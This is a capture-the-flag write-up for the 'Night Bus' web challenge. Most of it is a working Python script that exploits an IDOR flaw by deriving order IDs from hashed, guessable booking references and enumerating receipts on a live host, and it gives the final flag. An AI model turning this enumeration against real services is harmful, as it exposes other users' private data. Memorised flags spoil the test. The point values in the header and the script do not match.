---
title: "Night Bus"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Night Bus

## Summary

Target: `http://54.72.82.22:8330` (Werkzeug/3.1.9, Python/3.11.16)

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Night Bus (API, 200 pts) -- BOLA/IDOR on GET /api/orders/<object>.

The "/api/orders/<object>" route returns the receipt for the order whose
`object` matches the path segment, but every *wrong* segment still returns the
generic receipt "Two seats, balcony level." (a decoy).  So walking references
directly at that route is a dead end.

The leak: an order's `object` is not an opaque id -- it is the first 24 hex
chars of sha256(reference):

    sha256("TOUR-2401")[:24] == "289290bbb72721bcad2f8717"   # object from /api/orders

The list endpoint only ever exposes the first order (TOUR-2401) plus
`next_reference` = "TOUR-2402".  Since we know how `object` is derived, we can
compute the next passenger's object ourselves and read *their* receipt -- the
classic IDOR: one passenger's credential is derived from public data, so any
booking reference can be turned into a retrievable receipt.

Usage:  python solve.py
"""
import hashlib
import re
import sys

import requests

BASE = "http://54.72.82.22:8330"
FLAG_RE = re.compile(r"safctf\{[0-9a-f]{32}\}")


def object_for(reference: str) -> str:
    """The server keys orders by sha256(reference)[:24]."""
    return hashlib.sha256(reference.encode()).hexdigest()[:24]


def receipt_for(reference: str) -> str:
    r = requests.get(f"{BASE}/api/orders/{object_for(reference)}", timeout=10)
    r.raise_for_status()
    return r.json().get("receipt", "")


def main() -> int:
    # Sanity-check the derivation against the object published by the list route.
    listing = requests.get(f"{BASE}/api/orders", timeout=10).json()
    known = listing["items"][0]
    assert object_for(known["reference"]) == known["object"], "object-derivation check failed"

    start = int(known["reference"].split("-")[1])
    # The list advertises next_reference; walk a small window around it to be safe.
    for n in range(start, start + 8):
        ref = f"TOUR-{n}"
        receipt = receipt_for(ref)
        m = FLAG_RE.search(receipt)
        if m:
            print(m.group(0))
            return 0
        print(f"[{ref}] {receipt}")
    print("no flag found in window", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

```

## Flag

```
safctf{81a90dc817371a5aa190e8069ebcde2c}
```
